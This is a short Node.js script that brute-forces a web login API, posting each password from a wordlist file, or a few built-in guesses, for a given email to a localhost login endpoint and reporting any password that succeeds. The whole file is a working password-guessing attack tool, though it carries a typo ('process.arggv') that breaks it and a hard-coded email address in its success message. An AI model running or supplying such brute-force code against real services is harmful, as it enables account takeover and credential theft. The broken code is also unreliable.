const fetch = require('node-fetch');

let passwordToTry = [];

const fs = require('fs').promises;

const passFileIndex = process.argv.indexOf("-P");
const userIndex = process.argv.indexOf("-U");

async function loadData(){
	const filename = process.argv[passFileIndex + 1];
	const data = await fs.readFile(filename, 'utf8');
	return data;
};

const brute = array => {
	for(let i in array)
	{
		let body = {
			email: process.arggv[userIndex + 1],
			password: array[i]
		};

		fetch("http://localhost:3000/api/auth/login", {
			method: 'POST',
			headers: {'Content-Type': 'application/json'},
			body: JSON.stringify(body)
		})
		.then(res => {
			res.json()
			.then(info => {console.log("Tested | " + i + "/" + array.length)})
			.catch(err => {console.log("charged | " + i + "/" + array.length)});
			
			if(res.status == 200)
			{
				console.log("Password found for | larcher501@gmail.com : "+ array[i]);
				process.exit(1);
			}
			
		})
		.catch(() => {console.log()});
	}
}

if(passFileIndex > -1)
{
	console.log("FILE FOUND");
	loadData()
	.then(data => {
		data = data.split("\r");
		data = data.join('');
		data = data.split("\n");
		brute(data);

	})
	.catch(err => {
		console.log(err);
	});

	
}

else
{
	brute(["12340", "4568970", "ksjfhkue", "110690"])
}



